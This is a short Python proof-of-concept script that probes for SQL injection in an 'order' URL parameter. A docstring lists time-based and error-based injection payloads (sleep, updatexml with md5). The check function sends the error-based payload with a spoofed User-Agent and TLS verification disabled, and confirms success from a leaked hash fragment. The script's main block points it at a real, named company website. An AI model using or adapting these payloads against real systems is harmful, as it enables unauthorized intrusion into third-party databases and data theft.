import requests, re, urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def substr(strs, s, lens):
    result = strs[s:s + lens]
    return result


def randomInt(s, e):
    import random
    key = random.randint(int(s), int(e))
    return key


r = randomInt(10000, 1000000)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    '''
    ?order=-id
    ?order=vuln_collection.name);select%20sleep(10)%23
    ?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20md5("12222"))),1)%23
    '''
    targetUrl = url + "?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20md5(" + str(
        r) + "))),1)%23"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
    }
    response = requests.get(targetUrl, headers=headers, timeout=20, verify=False)
    if substr(md5(str(r).encode()).hexdigest(), 0, 16) in response.text:
        return targetUrl
    else:
        return False


if __name__ == '__main__':
    print(doCheck("https://freightsmart.oocl.com/"))
